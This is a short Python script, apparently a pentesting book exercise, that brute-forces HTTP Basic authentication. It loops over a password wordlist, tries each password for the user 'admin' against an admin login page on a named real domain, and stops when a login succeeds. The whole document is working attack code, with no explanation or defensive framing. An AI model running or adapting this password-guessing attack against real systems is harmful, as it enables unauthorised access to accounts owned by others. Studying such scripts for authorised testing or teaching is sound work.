import requests
from requests.auth import HTTPBasicAuth

with open("./wordlists/cain.txt") as passwords:
    for password in passwords:
        password = password.strip()
        req = requests.get('http://packtpub.com/admin_login.html',
                           auth=HTTPBasicAuth('admin', password))
        if req.status_code == 401:
            print(f"{password} Failed")
        elif req.status_code == 200:
            print(f"Login Successful with: '{password}'")
            break
        else:
            print(f"Error Occurred with {password}")
            break
